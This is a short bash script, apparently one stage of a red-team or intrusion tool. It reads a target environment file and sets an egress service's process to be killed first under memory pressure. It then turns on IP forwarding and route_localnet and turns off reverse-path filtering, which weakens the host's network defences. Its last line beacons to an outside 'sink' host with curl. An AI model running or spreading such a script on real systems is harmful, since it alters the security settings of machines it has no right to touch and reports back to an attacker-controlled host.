#!/bin/bash
. /opt/rt/work/target.env
pid=$(systemctl show -p MainPID --value rt-egress)
[ -n "$pid" ] && echo 1000 > "/proc/$pid/oom_score_adj" 2>/dev/null || true
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
echo 1 > /proc/sys/net/ipv4/conf/all/route_localnet 2>/dev/null || true
echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter 2>/dev/null || true
curl -s -m 3 -d 'rt-l4' "http://$SINK_IP:8080/e08" || true
